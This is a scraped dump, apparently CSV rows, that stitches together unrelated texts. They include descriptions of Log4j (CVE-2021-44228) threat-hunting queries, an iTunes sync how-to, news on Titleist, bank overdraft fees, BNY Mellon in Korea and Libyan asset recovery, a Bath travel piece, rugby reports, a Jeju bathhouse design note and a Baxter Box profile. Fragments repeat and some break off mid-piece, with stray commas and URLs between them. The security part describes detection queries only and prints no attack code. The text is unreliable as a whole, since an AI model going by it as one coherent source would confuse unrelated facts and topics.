This hunting query helps detect suspicious encoded Base64 obfuscated scripts that attackers use to encode payloads for downloading and executing malicious files. This technique is often used by attackers and was recently used to the Log4j vulnerability in order to evade detection and stay persistent in the network.

This query alerts on attempts to terminate processes related to security monitoring. Attackers often try to terminate such processes post-compromise as seen recently to exploit the CVE-2021-44228 vulnerability.

This query uses syslog data to alert on any suspicious manipulation of firewall to evade defenses. Attackers often perform such operations as seen recently to exploit the CVE-2021-44228 vulnerability for C2 communications or exfiltration.

This query uses various log sources having user agent data to look for CVE-2021-44228 exploitation attempt based on user agent pattern.

This hunting query looks for connection to LDAP port to find possible exploitation attempts for CVE-2021-44228.

This query uses syslog data to alert on any attack toolkits associated with massive scanning or exploitation attempts against a known vulnerability

This query uses syslog data to alert on possible artifacts associated with containers running images related to digital cryptocurrency mining.

This query looks for outbound network connections using the LDAP protocol to external IP addresses where that IP address has not had an LDAP network connection to it in the 14 days preceding the query timeframe. This could indicate someone exploiting a vulnerability such as CVE-2021-44228 to trigger the connection to a malicious LDAP server.

When you plug an iPhone or iPod into a computer with iTunes iTunes opens and tries to perform an automatic sync with the device. This is designed to be convenient since it prevents you from having to open iTunes manually. But there are some good reasons for wanting to disable automatic sync with iTunes.



How to Stop Automatic Sync in iTunes 12 and Newer

If you're running iTunes 12 and up follow these steps to stop automatic syncing:

These settings apply whether you sync your iPhone to iTunes over Wi-Fi or if you use the USB cable that comes with your iPhone.

Connect your iPhone or iPod to your computer. iTunes should launch automatically. If it doesn't launch the program. If necessary click the small iPhone or iPod icon in the top left corner just beneath the playback controls. This takes you to the Summary screen. In the Options box uncheck the box next to Automatically sync when this iPhone is connected. Click Apply in the bottom right corner of iTunes to save your new setting. From now on your iPhone or iPod will not auto-sync when you connect it.

Why You Might Want to Disable Automatic Sync in iTunes

Some of the reasons you may want to stop iTunes from automatically syncing with your devices include:

It's not your computer : Sometimes we plug our iPhones into our work computers or computers that don't belong to us to charge the battery. In that case you won't want the iPhone to sync with the computer.

: Sometimes we plug our iPhones into our work computers or computers that don't belong to us to charge the battery. In that case you won't want the iPhone to sync with the computer. It's not your primary computer : Even if the computer belongs to you if it's not the one you normally sync with it won't have the right data on it. You don't want to accidentally delete the data you need with old information.

: Even if the computer belongs to you if it's not the one you normally sync with it won't have the right data on it. You don't want to accidentally delete the data you need with old information. You don't have time: Syncing can take a long time. If you have a lot of data to sync or if you're having problems syncing some kinds of content it can take a long time. If you're in a rush you won't want to wait.

Whatever your reason the steps you need to follow to stop automatic sync differ based on what version of iTunes you have.



How to Disable Automatic Sync in iTunes 11 and Earlier

For earlier versions of iTunes the process is fairly similar but the steps and onscreen options are slightly different. If your version of iTunes is older and doesn't have these exact options find the ones that are the closest match and try those.

Before you plug the iPhone or iPod into the computer open iTunes. Open the Preferences window. On a Mac go to the iTunes menu -> Preferences -> Devices .

-> -> . On a PC go to Edit > Settings > Devices. You may need to press Alt+E on the keyboard to reveal this window since the menu is sometimes hidden by default. In the pop-up window click the Devices tab. Look for the checkbox labeled Prevent iPods iPhones and iPads from syncing automatically. Click that checkbox. Click OK at the bottom of the window to save your changes and close the window. Auto-sync is now disabled. Quit iTunes and plug your iPod or iPhone into the computer and nothing should happen. Success!

Remember to Sync Your iPhone or iPod Manually

With these changes made your device won't automatically sync every time you connect it. That means you have to make sure you remember to sync manually from now on.

Syncing is what creates backups of the data on your iPhone or iPod which is crucial for restoring data after problems with your device or transferring your data if you're upgrading to a new device. If you don't have a good backup you'll lose important information like Contacts and Photos. Get in the habit of regularly syncing your device and you should be fine.",,,,,,,,,

Fox News’ Andrew Mark Miller appears to have worked hard to test out Titleist’s golf ball personalization censors after an enraged customer was rejected over a “Lets Go Brandon” request. The phrase became one of the more pathetic dimwit dogwhistles of this or any generation.

When Fox News Digital attempted to personalize a Titleist Pro V1 ball on the company’s website with the phrase ""Let’s Go Brandon"" an error message said ""Sorry one or more of the words you have chosen cannot be used. Please see our Terms and Conditions to learn more about what we will imprint.""

On the website part of those Terms and Conditions reads ""Acushnet Company reserves the right to reject orders for imprints on our products that may in our sole discretion be inconsistent with our company values or brand identity including but not limited to logos designs and/or personalizations that are negative in nature advocate violence or illegal activity or are slurs hateful threatening libelous defamatory vulgar obscene or pornographic.""

It is unclear which of those categories the phrase ""Let’s Go Brandon"" violated.

Miller goes on to share the vulgar messages he tested and did not get the same error message. Some of them are not pleasant. Still it’s fascinating to see Fox News upset over Titleist reserving their rights as a corporation to not sell a product.

How did this path prepare you to form The Royal Lifestyle Corp?

I went to college and played golf ran on the track team and studied engineering and drama. I also acted in several stage plays while in college and had fun creating characters different from myself. I was interested how things were made so after college I worked in engineering for four years and loved it. While working as an engineer I played golf before and after work and on the weekends. This helped keep my body and golf game in very good shape.

Eventually I got tired of working indoors all the time and decided to try professional golf. This was fun but ‘living out of a suitcase’ just wasn’t for me so I decided to try and become an actor writer and producer. So I went to Hollywood to see what would happen.

Because of my acting and golfing abilities I wrote and hosted several TV commercials for various auto companies and got invited to play golf as a celebrity in charity golf tournaments all over the US.

Among your many business ventures you have designed and launched a range of golf clubs. What makes your clubs different to those already in the market?

I remembered from my engineering days that energy is magnified as it comes out through the surface of the ball bearing – like hitting a nail with a hammer.

I named this line of clubs after a movie I wrote called John Jumano and named the driver in this line of clubs JC1 – The Only One. This club is quickly gaining a reputation of being one of the world’s longest hitting golf clubs.

What are your future ambitions for The Royal Lifestyle Corp? What is your growth strategy for the coming months and years?

With our promotional abilities we expect both our brands and products to be in high demand worldwide within a year or two. My wife the Roman countess Donatella Pecci-Blunt has developed a superb perfume fragrance called ‘Contessa’ which we expect will become a sought-after top-seller worldwide. TV commercials and online social media campaign materials are already produced and ready to be launched in Europe Asia and the United States.

I would like very much to see The Royal Lifestyle become a a household name and a super proﬁtable company. We have no debts and all our products have been developed and tested to make sure that people will love them.

Furthermore we currently have several movies in the pipeline ready to go into production alongside tested golf clubs and perfume marketing ad campaigns ready to be rolled out on TV and social media.

With all the major work done and marketing campaigns ready to go I am keen to speak with potential partners and investors that can help take the Royal Lifestyle brand to the next level.

The stock market's recovery rally over the past week represents an opportunity for investors to sell ahead of an upcoming Fed interest rate ""shock"" Bank of America's Michael Hartnett said in a Friday note.

Hartnett recommends investors ""sell the rip"" rather than ""buy the dip"" in stocks as interest rate hikes are about to rock Wall Street and amid a strikingly similar unwind in tech stocks compared to the dot-com bubble in 2000.

According to Hartnett the Fed could and should begin to hike interest rates at its December meeting next week. If they don't the market will price in a 0.50% interest rate hike in March 2022 because of a ""red hot labor market"" Hartnett said pointing to Thursday's jobless claims data hitting its lowest level since 1969.

If Hartnett's Fed rate hike expectations pan out that would likely be a shock to Wall Street with most market participants expecting the Fed to start with a 0.25% rate hike in the second half of 2022. ""The lead indicator (yield curve) all say 'Fed coming' but investment grade bonds and FAANG do not"" Hartnett said.

Hartnett is referring to the mega-cap tech complex which consists of five stocks driving 64% of the Nasdaq's 23% year-to-date gain. Those five stocks are Microsoft Alphabet Apple Nvidia and Tesla.

""The bubble in speculative froth has popped"" Hartnett said highlighting that the ongoing breakdown in Ark Invest's Disruptive Innovation fund is closely tracking the descent of Invesco during the 2000 dot-com unwind. Ark's Cathie Wood defended her fund's investment strategy this week and estimates big gains ahead.

Finally investors shouldn't get too excited about short-term rallies in the stock market after big sell-offs as they tend to serve as head fakes to bullish investors during a declining market. According to Hartnett's analysis the Nasdaq staged 11 ""dead cat bounces"" with rallies as high as 45% between April 2000 and August 2002 well before the stock market bottomed in October 2002.

Since the Nasdaq fell about 5% in late November it has since rallied as much as 4.5% before continuing slightly lower representing a dead cat bounce if it doesn't hit record highs in the near future.",https://news.google.com/articles/CBMiTGh0dHBzOi8vd3d3Lndhc2hpbmd0b25wb3N0LmNvbS9vcGluaW9ucy8yMDIxLzEyLzEyL292ZXJkcmFmdC1mZWUtcmVndWxhdGlvbi_SAQA?hl=en-US&gl=US&ceid=US%3Aen,Opinion | Overdraft fees have become a plague.

LucaTDB/Getty Images

Paul Constant is a writer at Civic Ventures and cohost of the ""Pitchfork Economics"" podcast.

Mainstream banks have created a host of fees and penalties designed to target their poorest customers.

The truth is that banking in America needs a top-down reform he writes.

In February of 2020 I wrote about the predatory payday lending industry which offers very small loans at high-interest rates to desperate low-income people. But payday lenders aren't the only institutions taking advantage of the lowest-earning quarter of Americans. Mainstream financial institutions have created a host of fees and penalties over the past few decades designed specifically to target and profit from their poorest customers.

One of the most common exploitative mechanisms big banks use to target the poor is the overdraft fee—a charge banks levy on customers who make payments that are larger than the amount of funds left in their account. Last week new Consumer Financial Protection Bureau director Rohit Chopra announced that banks reported collecting an eye-popping $15.5 billion in overdraft fees in 2019 with nearly a third of that sum coming from just three banks: Wells Fargo JP Morgan Chase and Bank of America.

It's easier than you may think to accidentally overdraft your bank account. When you're one of the millions of Americans living paycheck to paycheck a single unexpected expense—a child's ear infection say or your car breaking down on a morning commute—can wipe out your bank balance which means any outstanding charge like a regularly scheduled utility payment can easily push you into overdraft territory.

But over the years banks have layered a number of financial complexities on top of their overdraft policies further rigging the system in their favor. In his statement on overdraft fees Chopra said that banks have capitalized on the timing gap between payment authorizations and settlements ""the use of one kind of balance over another for fee calculation purposes or the order of transaction processing across different types of credit and debits"" to increase customers' chances of incurring the highest overdraft fee possible.

If you're a middle-class American with three months' worth of emergency savings on hand and automatic overdraft protection on your checking accounts this all might sound unbelievable like a missive from an alien planet. That's because these exploitative overdraft fees are targeted to affect only a small portion of banking customers—specifically the poorest few. The CFPB estimates that fewer than ten percent of all bank customers are responsible for nearly 80 percent of all overdraft fees.

Also last week Capital One announced that they will officially end overdraft fees making them the largest bank to do so. Capital One CEO Richard Fairbank issued a statement saying the move was intended to bring ""simplicity and humanity"" to banking creating ""an important safety net for families.""

Fairbank didn't comment on why it took Capital One many years to finally decide to honor the ""humanity"" of its customers by eliminating overdraft fees. But it's most likely not a coincidence that the bank's action happened at the same time that the CFPB started to crack down on the practice.

Chopra praised Capital One for the move but said his agency wasn't going to wait for other large financial institutions to follow suit of their own free will. Instead he said the CFPB ""will be considering a range of regulatory interventions to help restore meaningful competition in this market rather than allowing large institutions to rely on junk fees forever.""

Unfortunately overdraft fees aren't the only way that financial institutions prey on poor people in America. Even setting aside the payday loan industry some of the largest and most reputable banks in the nation continue to penalize customers for not meeting minimum-balance requirements; pester them with tiny fees to keep and maintain checking accounts; and they fail to make loans available to low-income Americans thereby denying them the opportunity to build a better future. The truth is that banking in America needs a top-down reform. It's not enough to simply help the rich get richer anymore; our financial institutions must help all Americans build their wealth and invest in the future."

It is one of many foreign financial institutions that have lost interest in Asia’s fourth-largest economy in recent years.According to industry sources Korea’s policymaking Financial Services Commission recently approved BNY Mellon Seoul branch’s request to pull the plug on its financial investment business and trust services. Foreign financial institutions are required to obtain the FSC’s permission before downsizing or exiting their operations here.BNY Mellon said in a statement released Monday that the closure of its corporate trust business is ""a strategic decision"" aimed at streaming its franchise in Korea to focus on providing value-added services to its clients.BNY Mellon first entered Korea in 1988 establishing a branch in Seoul. Besides the main branch it currently has two representative offices here -- BNY Mellon IM Korea an asset management office in Seoul and the BNY Mellon office in Jeonju North Jeolla Province.BNY Mellon’s latest decision to downsize its operations here comes mere years after the New York-based global banking giant made a rare move in 2019 by opening a Jeonju office to deepen its partnership with the National Pension Service of Korea. BNY Mellon was selected by NPS one of the world’s largest pension funds as the global custodian for its fixed income mandate.But it also follows an announcement in April from fellow New York-based global banker Citigroup which is taking its retail banking business out of Korea and 13 other global markets.Despite Citibank Korea’s monthslong efforts to find a suitable buyer for its retail banking division it announced in late October that it would pull its consumer banking operations out in phases. The Korean subsidiary of the US banking giant recently said 2300 employees more than 60 percent of its 3500-strong workforce applied for its voluntary retirement program in connection with its consumer business exit. Employees who choose to leave the company early as part of the program could receive up to seven years’ salary with a cap of 700 million won ($592000).Since 2013 major global banking groups have been either downsizing their services here or pulling out from the market completely. UK-based multinational banking group HSBC pulled the plug on its consumer banking business in 2013 a move mirrored by Citigroup nearly a decade later.Goldman Sachs Royal Bank of Scotland and Barclays left the market in 2017 while Swiss-based UBS' bank unit and Australia-based Macquarie Bank pulled out in 2018 and 2019 respectively. Most recently Canadian banking group Scotiabank -- which entered the market in 1978 -- terminated its Korean operations in October this year.The series of exits accompanies Korea’s struggle to transform itself into a financial hub a goal the liberal Roh Moo-hyun administration announced in 2003.Foreign companies have often complained of Korea’s unfavorable tax rates and strict regulations as key obstacles. The government often issues strict orders to banks putting caps on household lending and dividend payouts. Citibank Korea has cut its dividend payouts to within 20 percent of its annual net profit in recent years under Korean government pressure after paying out 35 percent both in 2017 and 2018.In a meeting between former FSC Chairman Eun Sung-soo and CEOs of 17 foreign financial institutions that are operating in the Korean market last year the CEOs pointed out that Korean authorities continue to make multiple interpretations of financial regulations creating confusion for the businesses.They also complained that Korea‘s 52-hour work week system which was first adopted in 2018 to prevent workers from “overworking” has had multiple side-effects. The CEOs told the FSC that the working-hours system has become a hurdle for foreign businesses here in communicating with their overseas headquarters. The 17 companies included Bank of America Merrill Lynch and BlackRock.But Korea has yet to give up on its hopes of becoming a financial hub with the Seoul Metropolitan Government announcing last month that it would funnel 241.8 billion won over the next five years to attract financial institutions from overseas. Seoul Mayor Oh Se-hoon seeks to triple foreign direct investment to $30 billion and provide employment and rent subsidies for foreign institutions.In the latest Global Financial Centers Index compiled by Z/Yen Group Seoul ranked 13th up three places from last year but remained behind Hong Kong Singapore London New York Paris Shanghai and Beijing.",https://news.google.com/articles/CBMicmh0dHBzOi8vd3d3LmJsb29tYmVyZy5jb20vbmV3cy9hcnRpY2xlcy8yMDIxLTEyLTExL2ZlZC1oaWtlcy1zZWVuLXN0YXJ0aW5nLXdpdGgteWllbGQtY3VydmUtZmxhdHRlc3QtaW4tZ2VuZXJhdGlvbtIBAA?hl=en-US&gl=US&ceid=US%3Aen,Fed Bond Markets on Collision Path on View of Rate Cycle,"The Federal Reserve is laying the groundwork for the start of a cycle of interest-rate hikes that the bond market warns might be unusually constrained in how far it can go setting the two on a collision course where one will eventually have to give.

In its filing Thursday in Manhattan federal court the Libyan Asset Recovery and Management Office (LARMO) says that JPMorgan Chase & Co. Citigroup Inc. and six other large banks may have information about the money Qaddafi his family and associates stole.

According to LARMO the accused transferred the money through Bank of America Corp. UBS Group AG HSBC Holdings PLC Credit Suisse Group AG Bank of New York Mellon Corp. Deutsche Bank AG. and Citi and JPMorgan.

The agency estimates that at least tens of billions of dollars worth of assets that Qaddafi and his agents stole remain missing.

In a statement Thursday Larmo legal team said that effort could become the largest international asset recovery in history.

LARMO was set up in 2017 with UN and EU support to recover stolen Libyan assets during Qaddafi’s era. The agency says its goal is to track down money looted through corrupt business deals and embezzlement of government funds.",,,,,,

The city was founded in the first century by the Romans who used its natural hot springs as a thermal spa. But a dip in those steaming waters in an elaborately engineered underground temple dedicated to Minerva goddess of healing is off limits to visitors who wander through the historic site today.

At the Cleveland Pools however you can once again take the plunge. This equally impressive water complex was built in 1815 and continuously used for bathing until 1984. Following a nearly £10-million restoration the complex believed to be the oldest surviving outdoor public swimming pool in the United Kingdom reopened to the public in the fall. Its main attraction is a large curvilinear pool originally reserved for male bathers who had been banned from swimming nude in the adjacent river.

Cleveland Pools can only be reached on foot through the scenic trails of a quiet residential cul-de-sac which contributes to its somewhat secret status. Travelling there takes you through layers of Saxon medieval and Tudor architecture and most notably neoclassical Palladian buildings constructed during the 18th century under the reign of George III. Accented with honey-coloured limestone pediments and Corinthian pilasters these landmarks give the city its distinctive glow even in the pouring rain.

The direct 90-minute train from London Paddington means that Bath population 100000 sees a significant influx of visitors particularly for weekend getaways. Many of those tourists come to town to experience the waters and the historic cityscape to follow in the literary footsteps of Mary Shelley (who wrote much of her landmark gothic Frankenstein while attending lectures in town) and Jane Austen (who lived here briefly) and to hop between filming locations of Netflix’s blockbuster Regency-era series Bridgerton. Lately the city is also becoming a destination for fans of a branch of contemporary British design that’s anchored in history.

Bath’s influx of weekenders also includes more than a few hen and stag parties which is why during my visit in October I opted to stay in Bathwick. It’s a quiet area on the opposite bank of the River Avon and only a 10-minute stroll across neoclassical Pulteney Bridge from the bustling city centre. I enjoyed coming and going along Great Pulteney Street a wide formal avenue flanked by the unspoiled Georgian architecture of luxurious terraced townhouses.

Open this photo in gallery: Holburne Museum Bath's first public art gallery and former home of Sir Thomas Holburne.

At its east end is the Holburne Museum. Doubling as the stately residence of Bridgerton’s formidable Lady Danbury in real life it’s the onetime home of Sir Thomas Holburne a lifelong collector of quirky miniatures old masters and objets d’art he later bequeathed to the city. A recent exhibition was devoted to painter Gwen John whose reputation only emerged out the imposing shadow of her artist brother Augustus and lover Auguste Rodin after her death in 1939.

Great Pulteney Street is only one of the city’s architectural set pieces. The Circus a round residential street of townhouses from 1754 is another masterpiece of graceful urban planning. Its streetscape overflows ornamentation in the forms of friezes decorative emblems and triglyphs. The curving Palladian façades of nearby Royal Crescent overlook the vast Royal Victoria Park lawn. Among them No. 1 is the city’s most prestigious address housing a museum styled entirely in the Georgian manner (and doubling as another Bridgerton backdrop the Featherington family’s abode).

The Assembly Rooms referenced by Austen was one of the legendary dance halls at the heart of aristocratic socializing in her day and it still drips with crystal chandeliers and ornate mouldings. During a visit you can practically hear the gossiping ghosts of socialites past. At the nearby Jane Austen Centre those ghosts are in fact real-life guides costumed in Regency garb who lead tours in character.

All this history – and occasional kitsch – forms the groundwork for the contemporary designers galleries and quirky shops that draw on the city’s heritage values. Nowhere is this more in evidence than at the influential design boutique Berdoulat. Based in Margaret’s Buildings a historic pedestrian street lined with independent design shops Berdoulat is Patrick Williams’s architectural design practice which specializes in period building restoration. It’s also the three-storey Georgian shopfront he co-founded with his wife Turkish and Bulgarian photographer Neri Williams.

The wood countertops brass scales and antique apothecary jars are heirlooms just as Berdoulat’s many tableware and interior accessory collaborations with local artisans will eventually become. From cutlery baskets by Bath’s Willow pottery to canelé-shaped ceiling fixtures by Devon ceramicist Feldspar all its pieces are designed in collaboration with regional makers. The simple refectory tables lipped bowls and oak egg racks highlight craft and epitomize beautility the latest buzzword for functional home essentials in modest materials.

As someone who thrills at the archaic terminology of estate interiors – think “boot rooms” “butler’s pantries” and anything featuring the word “scullery” – the new DeVOL Kitchens showroom tucked in the corner of a historic building block nearby is a twofold pleasure. The firm specializes in (and popularized) handmade kitchen furniture inspired by historic home aesthetics that fuse classic unfitted Georgian and farmhouse styles with modern conveniences. The copper worktops Shaker wainscotting aged brass taps slatted plate racks and fluted marble bib sinks of the three atmospheric showroom kitchens are swoon-worthy – and could easily have been plucked out of any of the high-ceilinged townhouses on the street.

Niche bookshop and publisher Persephone Books sits next door in the Edgar Buildings. It was established 25 years ago to excavate a more recent history: neglected works (mostly by women) from the mid-20th century. As much as I adore Austen Persephone is the reason I’ve come to Bath: a pilgrimage to the bookshop that has unearthed so many of my favourite reads. The publisher’s attention to design detail rivals that of its neighbours. The vestibule and fixtures are done up in the same signature dove grey as its books each with individual endpapers reproducing period textiles and wallpapers chosen to complement the material. A period upholstery fabric for example lines an edition of the once-forgotten 1938 charmer Miss Pettigrew Lives for a Day by Winifred Watson that is Persephone’s perennial bestseller.

Among the cluster of well-curated art and antique shops up the hill Francis Gallery is set inside another of these heritage-listed Georgian townhouses with wood furnishings and plinths in tonal shades of ecru arranged like a living space. Korean-Canadian founder and director Rosa Park grew up in Vancouver. Prior to opening the gallery (which also has an outpost in Los Angeles) to present the work of emerging international artists she created Cereal an acclaimed indie magazine about travel and lifestyle. The space is as warm and understated as her magazine pages with diffused lighting like something out of a Hammershøi painting adding to the moodiness of the ghostly Krista Mezzadri monotype prints on show when I visited.

Retracing my steps to explore an area around the railway station I took the invigorating waters of a different kind at Bath Botanical Gin Distillery & Herbal Apothecary the passion project of medical herbalist Sue Mullett. As a one-woman operation its hours are limited but I stopped by at just the right time to sample the micro-distillery’s offerings of boozy small-batch tonics inspired by traditional apothecary tinctures. Mullett’s crisply refreshing No.1 Gin is the only authentically Bath-produced gin and every wax-sealed bottle comes out of the copper still that is the petite room’s centrepiece. It is yet another example of how Bath’s modern sense of craft and culture flourishes because of the reverence for the city’s history.

Prop Du Toit scooped the ball up before forcing his way over with Finn Russell adding the conversion.

Nine minutes later Bath scored again but this time it needed checking. Du Toit fell short of the line but the ball found Spencer. The officials looked to see if there was a knock-on in the build-up but the try stood and was converted from close range.

Bath looked to be running away with it when Cokanasiga powered over in the right corner on 28 minutes before another Russell conversion.

The Falcons got on the board when Blamire forced himself over the line following a superb maul near the corner but Brett Connon's conversion fell just short.

Gallagher scythed through the Newcastle defence on 38 minutes and secured a bonus point with another converted try.

Blamire responded to end the half with his second following another driving maul. Again Connon failed to convert.

The frenetic pace to the match did not cease after the break; Newcastle were not letting go of the slim chance of a first victory in over a year and their scrum which had been dominant all night maintained their foothold in the game.

Stuart's try came after another strong drive as Newcastle made their superior territory and possession count.

Text description provided by the architects. Jocheon is a small village on the northeastern coast of Jeju. It is a seaside village known as a great place to see the sunrise every day. To the north is the blue sea of Jocheon and freshwater springs from the ground near the beach. Jocheon has been a clean and abundant village with clean spring water which was used by the people for washing and drinking before the waterworks were installed. This plot of land silently watching over the sea is about 18 square meters in size and is on the boundary between the beach of Jocheon and the freshwater springs.

This was a place for the travelers to begin and end their day. So what did it have to offer? We focused on the element of ‘water’ as harbored by the beach of Jocheon. We wanted the most daily element to give the most non-daily experience in this space. ‘Taking a bath’ is a very simple and daily action yet a powerful ritual of rearranging one’s mind and relieving the physical and mental fatigue. The Chinese character for bath is 浴 (Yok).

It represents the pouring water and means to clean the wastes with the force of water flowing downwards. We planned this space to be a place for relaxing and recharging focusing on the acts of washing and wiping in a space filled with various forms of water such as pouring water gushing water still water gazing water and steam.

The Jocheon Yokjang is a small bath place consisting of 3 floors that are about 15 square meters each. The building was designed to be within 50 square meters without a parking area so that the yard can be used more widely and it is a private space for only 2 people. The 3rd floor is a bathing space with an ocean view and various washing experiences. The 2nd floor is the bedroom and the 1st floor is the kitchen. The vertical concrete building is only open on the sides that come in contact with nature.

Only the surfaces that accept the ocean view and light are open and all other surfaces are completely shut from the outer world. The concrete walls have wood grain patterns that hold the movement of light. Along the basalt wall is the entrance path that opens into the garden and through the garden is the inside of the house. The entrance path is long enough to heighten the immersion in the space and the unpredictable changes of the space diversify the experience.",https://news.google.com/articles/CBMinAFodHRwczovL3d3dy5ldXJvc3BvcnQuY29tL3J1Z2J5L2dhbGxhZ2hlci1wcmVtaWVyc2hpcC1zYWxlLWNsaW1iLWludG8tdG9wLWZvdXItd2l0aC1ib251cy1wb2ludC13aW4tb3Zlci1sZWljZXN0ZXItYmF0aC1icnVzaC1uZXdjYXNfc3RvMTAxMzk0NjIvc3Rvcnkuc2h0bWzSAQA?hl=en-US&gl=US&ceid=US%3Aen,Gallagher Premiership: Sale beat Leicester to climb into top four Bath close in on playoffs with Newcastle win,"Sam James of Sale Sharks celebrates scoring a try during the Gallagher Premiership Rugby match between Sale Sharks and Leicester Tigers at AJ Bell Stadium on May 10 2024 in Salford England.

Sale Sharks heaped pressure on Bristol Bears Saracens and Harlequins with a deserved bonus-point 31-22 victory over Leicester Tigers as Alex Sanderson’s side continued their attacking rebirth to move into the Gallagher Premiership play-off places.

In almost certainly Sale’s last home game of the season club stalwart Sam James had the fairytale ending before departing in the summer as he scored an immensely popular try and also set up Tom O’Flaherty’s bonus-point score with a sumptuous kick.

Early tries from Gus Warr and Tommy Taylor helped condemn Leicester to a pointless defeat as they chase Investec Champions Cup qualification for next season.

Dan Cole Matt Scott and George Martin crossed for Dan McKellar’s side but they were distinctly second-best as familiar face Manu Tuilagi also ran riot on his final home game for Sale too.

A good night was made even better for Sale fans when director of rugby Sanderson announced in a TNT Sports interview after the game that he had signed a three-year contract extension.

Tigers will be relying on Hollywoodbets Sharks beating Gloucester in the EPCR Challenge Cup final to secure the final English Champions Cup spot for next season.

Bath also continued their charge for the play-offs against Newcastle Falcons securing the bonus point in a rampant first half before holding off a late home comeback to move up to second place in the table with a 28-17 victory.

Leicester got off to the stronger start when veteran prop Dan Cole charged over the try line inside five minutes but the lead lasted only five minutes before a huge carry from Tuilagi put the Tigers defence on the back foot before Warr weaved his way over the line from close range.

To make matters worse Ollie Hassell-Collins was sent to the sin bin for a high shot when bringing down the barnstorming Tuilagi and Sale cashed in on their numerical advantage when Tommy Taylor finished off another neat lineout move a second successful conversion putting Sale 14-5 up.

An action-packed opening quarter continued to deliver the goods when Scott’s interception try narrowed the gap to two points.

The most celebrated score of the night arrived just before the break when James in his final home game for his boyhood club finished a fine team move to extend the hosts’ lead once more.

And the full-back was again instrumental for the crucial bonus-point score early in the second half sending a clever grubber kick through for O’Flaherty to gather and dive over in the corner.

Leicester’s resistance waned from then on Ford adding a penalty to further extend the lead and a consolation score from Martin in the closing minutes did little to spring any serious hopes of a comeback.

Bath go joint-top with Newcastle win

Bath continued their charge for the play-offs against Newcastle securing the bonus point in a rampant first half before holding off a late home comeback to move up to second place in the table with a 28-17 victory.

With creative hub Finn Russell back in the side following an injury  the visitors got off to a strong start Thomas du Toit reacting quickest to a loose ball to dot down the opening try after five minutes.

Scores from Ben Spencer and Joe Cokanasiga before the half-hour mark had Bath in cruise control but a frantic first half still had plenty to offer as Jamie Blamire crossed twice for Newcastle either side of Matt Gallagher’s bonus point-securing try for Bath to send the sides in at 28-10 at the break.

The second half was far less eventful with just one score to show for it Sam Stuart narrowing the gap with a third Falcons try but it was not enough to spark an unlikely fightback.

Arthur Zwane looks set to replace Stuart Baxter and could take over from the sidelines for Kaizer Chiefs against Sekhukhune United – HERE’S WHY

READ | KAIZER CHIEFS’ COVID-FREE PLAYERS REVEALED

Baxter could have Covid if recent reports on iDiskiTimes is to be believed.

Zwane looks set to take over in his absence and could make an appearance from the sidelines against United on Sunday. 48 players and staff members from Chiefs have already tested positive. So it is highly probably that their head coach is in isolation too.

This is a massive opportunity for Zwane who lead Amakhosi to their maiden CAF Champions League final earlier this year.

He achieved this with co-coach Dillon Sheppard. Now he has the opportunity to lead Chiefs in yet another history-making occasion. The Glamour Boys have not confirmed Baxter has Covid as yet but if he is not on the sidelines at the FNB Stadium on Sunday it will confirm this.

READ | PSL TO REVEAL KAIZER CHIEFS FATE – DATE AND TIME SET!

Amakhosi did however confirm the players unavailable.

Zwane then released a list of players who will play for Chiefs in their much-anticipated return to PSL action.",https://news.google.com/articles/CBMiIGh0dHBzOi8vbW9uZXlpbmMuY29tL2JheHRlci1ib3gv0gEA?hl=en-US&gl=US&ceid=US%3Aen,10 Things You Didn't Know about Baxter Box,"Baxter Box is one of the co-founders of LTK which might be more familiar to interested individuals as rewardStyle and LIKEtoKNOW.it. Currently he occupies the position of CEO meaning that he is responsible for overseeing its operations. Besides this it should be mentioned that Box is married to Amber Venz Box who is also a co-founder of the company.

1. Went to the University of San Diego

Box went to the University of San Diego which is a private Roman Catholic university that can be found exactly where its name says it can be found. There he studied electrical engineering as well as mathematics.

2. Went to Southern Methodist University

Later Box went to Southern Methodist University for his MBA. Like its name says Southern Methodist University is a private university associated with a religion as well. However it is associated with the United Methodist Church which came into existence in 1968 through the union of the Methodist Church with the Evangelical United Brethren Church. In turn the Methodist Church came into existence in 1939 through the union of the Methodist Episcopal Church the Methodist Episcopal Church South and much of the Methodist Protestant Church. It was the Methodist Episcopal Church South that founded Southern Methodist University in partnership with local civic leaders in Dallas TX.

3. Texan

Speaking of which both Box and his wife are Texans. In fact he went to high school in Dallas TX so it seems safe to say that he has a longstanding connection to the area.

4. Worked As an Engineer

Box made good use of his bachelor's degree in engineering by working as an engineer at Restech. There he was involved in a number of notable projects. For example Box improved the Dx-pH Measurement System before bringing the improved version of the product to market. Similarly Box designed the Dx-Sleep Adapter before bringing the resulting product to market. Eventually Box was entrusted with managerial duties as shown by how he was responsible for leading a team of engineers at one point in time.

5. Worked As a Sales Manager

Curiously Box made the choice to switch over to being a sales manager when he was still at Restech which isn't exactly the first thing that would come to mind considering his work as an engineer. Still considering that he was responsible for bringing products to market it seems safe to say that he had applicable expertise and experience that carried over. After all successfully bringing products to market requires at least some understanding of the market which is definitely the kind of information that can be used in sales. In any case Box was involved in training sales representatives as well as managing sales representatives as a sales manager. Furthermore he apparently did quite well in the position as shown by his claim that he increased sales in his assigned territory by 300 percent.

6. Worked As an Analyst

After Restech Box went to Bonanza Capital. However he didn't continue working as a sales manager which makes sense considering the name of that company. Instead Box became a trader as well as a technology research analyst. In particular he was focused on the tech media and Internet sectors. Something that is perhaps unsurprising considering the tech-based offerings of the company that Box runs in the present time.

7. Founded NastyGoat Corporation

LTK wasn't the first time that Box has either founded or co-founded a company. In 2008 he founded NastyGoat Corporation with the result that he served as both its President and its Chairman. As for what NastyGoat Corporation does it is apparently concerned with incubation investment and development.

8. Believes in the Importance of an Inspiring Work Environment

Box has written about some of the insights that he picked up while visiting Alibaba's campus. To name an example he mentioned the importance of an inspiring work environment. Box was commenting on inspiring architecture. However it is a well-known fact that people's surroundings have a huge effect on their happiness which in turn has a huge effect on their productivity. This is particularly true because the state of the working environment also says a great deal about the company's level of consideration for its employees. Unsurprisingly employees who aren't valued tend to be less than enthused about giving their employer their best but will instead tend to do what they can get away with.

9. Believes in Making It Easier for Employees' Work Life to Flow Into Their Personal Life

On a related note Box also wrote about making it easier for employees' work life to flow into their personal life. Essentially he means that companies should make it easier for their employees to access everything that they need to live well. Having said that Alibaba straight-up built a campus meaning that it has a lot of influence over what businesses can be found nearby because it straight-up paid for that kind of influence. For that matter even if companies choose to rent a location rather than build a location it seems safe to say that desirable locations are going to come at extra cost. As such while it definitely makes sense because of the role that convenience has on most people's satisfaction it isn't hard to see why companies might put this at a lower priority than other considerations.

10. Believes in Clearly Communicating the Company's Vision

